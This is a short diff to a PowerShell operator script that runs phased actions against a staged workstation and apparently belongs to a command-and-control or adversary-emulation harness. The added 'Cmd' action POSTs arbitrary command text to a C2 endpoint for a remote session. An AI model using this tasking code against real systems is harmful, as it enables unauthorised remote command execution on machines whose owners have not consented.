@@ -30,6 +30,7 @@ param(
     [ValidateSet('Pre', 'WaitSession', 'P1', 'P2', 'P3', 'Artifacts', 'Cmd', 'Run', 'Results', 'All', 'Stop')]
     [string]$Action = 'All',
     [string]$Staging = 'stage/ws01',
+    [string]$Body = '',
     [int]$TimeoutSeconds = 300
 )
 $ErrorActionPreference = 'Stop'
@@ -199,6 +200,7 @@ switch ($Action) {
     'Pre' { Start-Phase }
     'WaitSession' { Wait-Session }
     'P1' { Check-Phase1 }
+    'Cmd' { $t = Get-Phase3Token; Invoke-RestMethod -Method Post -Uri "$C2/cmd?session=$t" -Body $Body | Out-Null; "queued ($Action): $Body" }
     'Run' { Invoke-Run -Command $Body }
     'Results' { Show-Results }
     'P2' { Invoke-Phase2 }
